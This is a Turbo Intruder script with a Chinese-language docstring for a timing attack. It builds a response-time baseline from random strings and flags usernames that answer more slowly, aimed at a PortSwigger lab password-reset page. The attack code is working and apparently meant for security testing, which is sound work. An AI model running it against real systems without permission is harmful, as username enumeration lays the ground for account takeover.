"""
带状态的时序攻击脚本 - Turbo Intruder

功能说明：
这是一个高级的时序攻击脚本，使用状态管理来建立响应时间基线。
通过比较实际响应时间与基线时间，识别可能存在的时序漏洞。

测试地址：
您可以在以下地址测试此代码：
http://portswigger-labs.net/password_reset.php?username=%s

主要特性：
1. 状态管理 - 使用引擎状态存储基线数据
2. 基线建立 - 通过基准测试建立正常响应时间
3. 时序比较 - 将实际响应时间与基线对比
4. 智能检测 - 自动识别异常的响应时间

使用场景：
- 用户名枚举时序攻击
- 密码重置时序检测
- 数据库查询时序分析
- 文件存在性时序检测
- 权限验证时序绕过

技术特点：
- 引擎状态管理
- 动态基线计算
- 时序差异分析
- 自动异常检测

攻击原理：
1. 发送随机字符串建立响应时间基线
2. 发送真实用户名进行测试
3. 比较响应时间与基线的差异
4. 识别显著超出基线的响应

参数配置：
- concurrentConnections: 1（单连接确保时序准确性）
- requestsPerConnection: 100（每连接请求数）
- 基准测试次数: 20次
- 时序阈值: 基线最大值+10毫秒

状态管理：
- engine.userState['base_times']: 存储基线响应时间
- 用于在请求间共享状态信息
- 支持复杂的攻击逻辑

工作流程：
1. 初始化状态存储
2. 发送随机字符串进行基准测试
3. 收集基线响应时间
4. 发送目标用户名进行测试
5. 比较响应时间识别异常

基线建立：
- 使用20个随机字符串
- 收集所有响应时间
- 计算最大基线时间
- 作为后续比较的参考

检测逻辑：
- 如果响应时间 > 基线最大值 + 10毫秒
- 则认为可能存在时序差异
- 将异常响应添加到结果表

注意事项：
- 网络延迟可能影响结果
- 需要多次测试验证
- 阈值可能需要调整
- 适合稳定的网络环境

使用方法：
1. 修改目标URL和用户名列表
2. 根据目标调整时序阈值
3. 运行脚本进行时序分析
4. 观察异常的响应时间

优化建议：
- 增加基准测试次数
- 使用统计学方法计算阈值
- 添加网络延迟补偿
- 实现多轮验证机制
"""

def queueRequests(target, wordlists):
    # 创建时序攻击引擎
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,         # 单连接确保时序准确性
                           requestsPerConnection=100        # 每连接请求数
                           )

    # 初始化引擎状态，用于存储基线响应时间
    engine.userState['base_times'] = []

    # 基准测试：发送随机字符串建立响应时间基线
    for i in range(20):
        engine.queue(target.req, randstr(i), label='benchmark')

    # 目标用户名列表（可根据实际情况修改）
    usernames = ['test', 'foo', 'albinowax', 'bar']

    # 发送真实用户名进行时序测试
    for username in usernames:
        engine.queue(target.req, username)


def handleResponse(req, interesting):
    # 处理基准测试响应
    if req.label == 'benchmark':
        # 将基准响应时间添加到状态存储
        req.engine.userState['base_times'].append(req.time)

    # 处理实际测试响应
    elif req.time > max(req.engine.userState['base_times'])+10:
        # 如果响应时间显著超出基线（+10毫秒），则记录为异常
        table.add(req)

    # 可以添加更多分析逻辑：
    # - 计算统计学阈值
    # - 实现多轮验证
    # - 添加网络延迟补偿
    # - 记录所有时序数据用于分析
